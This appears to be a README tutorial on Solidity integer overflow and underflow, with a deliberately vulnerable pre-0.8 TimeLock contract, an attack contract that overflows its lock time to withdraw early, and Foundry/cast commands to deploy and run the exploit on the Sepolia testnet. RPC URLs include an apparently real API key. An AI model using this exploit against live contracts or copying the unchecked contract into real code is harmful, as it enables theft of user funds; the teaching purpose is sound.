# Web3eg-Smart-Contract-Hacking-overFlow-and-underFlow

# 🔢 Overflow & Underflow in Solidity

## 🧠 What is Overflow and Underflow?

- **Overflow** happens when a number **increases beyond** the maximum value a variable type can store.
- **Underflow** happens when a number **decreases below** the minimum value (usually `0` for unsigned integers).

---

## 🔢 Overflow Example

```solidity
uint8 x = 255;
x = x + 1;  // Overflow
uint8 can store values from 0 to 255.

Adding 1 to 255 wraps it back to 0.

📌 Result: x == 0
```


## 🔽 Underflow Example

```solidity


uint8 y = 0;
y = y - 1;  // Underflow
Subtracting 1 from 0 wraps it around to 255.

📌 Result: y == 255
```

🔒 Is it still a problem?

✅ Solidity ≥ 0.8.0: Overflow/Underflow is automatically checked. If it happens, the transaction reverts.


❌ Solidity < 0.8.0: You must use the SafeMath library to prevent these issues.



why use timeVualt?

1- vesting contract

2- timeLock governance

3-  IDO/ LuanchToken

4- staking


# Example
TimeLock Smart Contract
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

contract TimeLock {

    mapping(address => uint) balances ;
    mapping(address => uint) timeLock ;


    function deposit() public payable {
        balances[msg.sender] += msg.value ;
        timeLock[msg.sender] = block.timestamp + 30 days;

    }

    function increaseTimeLock(uint _increaseTimeLock) public{
        timeLock[msg.sender] += _increaseTimeLock ;
    } 

    function withdraw() public payable {
    require(balances[msg.sender] > 0);
    require(timeLock[msg.sender] < block.timestamp);
    uint amount = balances[msg.sender];
    balances[msg.sender] = 0 ;

    (bool sent ,)=msg.sender.call{value : amount}("");
    require(sent , "false");

    }
   
   
    }
```

## Script To Deploy 
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import {Script, console} from "forge-std/Script.sol";
import "src/TimeLock.sol";

contract deployTimeLock is Script {
    TimeLock public timelock;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        timelock = new TimeLock();

        vm.stopBroadcast();
    }
}
```

## Command to deploy
```
 forge script script/TimeLock.s.sol --rpc-url https://eth-sepolia.g.alchemy.com/v2/_No8Wj79rJBMDcMY2t_Fv --private-key <your private key > --broadcast
```
## Comand to deposit

```
cast send <contract address> "deposit()" --value 1ether  --rpc-url https://eth-sepolia.g.alchemy.com/v2/_No8Wj79rJBMDcMY2t_Fv --private-key <your private key > -- --broadcast
```

## Command to withdraw but get error because you have wait 30 days

```
cast send <contract address>  "withdraw()" --rpc-url https://eth-sepolia.g.alchemy.com/v2/_No8Wj79rJBMDcMY2t_Fv --private-key <your private key >
```
## Contract to Attack 
attack.sol

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

contract ITimeLock {
    function deposit() external payable{}
    function increaseTimeLock( uint _increaseTimeLock) external{}
    function withdraw() external{}


}

contract attack{
    ITimeLock public timelock ;

    constructor( address _timelock) {
        timelock = ITimeLock(_timelock);
    }

    function deposit() external payable{
        timelock.deposit{value : msg.value}();
    }
    

    function attackTimeLock() external{
        uint overflow = type(uint256).max - block.timestamp + 1 ;
        timelock.increaseTimeLock(overflow);

    }

    function withdraw() external{
        timelock.withdraw();
    }
    receive() external payable{}
}
```

## Script to deploy

```solidity

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import {Script, console} from "forge-std/Script.sol";
import "src/attack.sol";

contract DeployAttack is Script{


    function run() external{
        vm.startBroadcast();

    attack Attack = new attack(address(0xAb182c1FC8797c1Ef1f5493C0bcae9C365B082FA));


        vm.stopBroadcast();
    }
}
```

## Command to deploy

```
forge script script/DeployAttack.s.sol --rpc-url https://eth-sepolia.g.alchemy.com/v2/_No8Wj79rJBMDcMY2t_Fv --private-key <private key> --broadcast

```

## Command to exploit

```
cast send <contract address> "attackTimeLock()"  --rpc-url https://eth-sepolia.g.alchemy.com/v2/_No8Wj79rJBMDcMY2t_Fv --private-key <private key>

```
## Command to withdraw after exploit

```
cast send <contract address> "withdraw()"  --rpc-url https://eth-sepolia.g.alchemy.com/v2/_No8Wj79rJBMDcMY2t_Fv --private-key <private key>

```
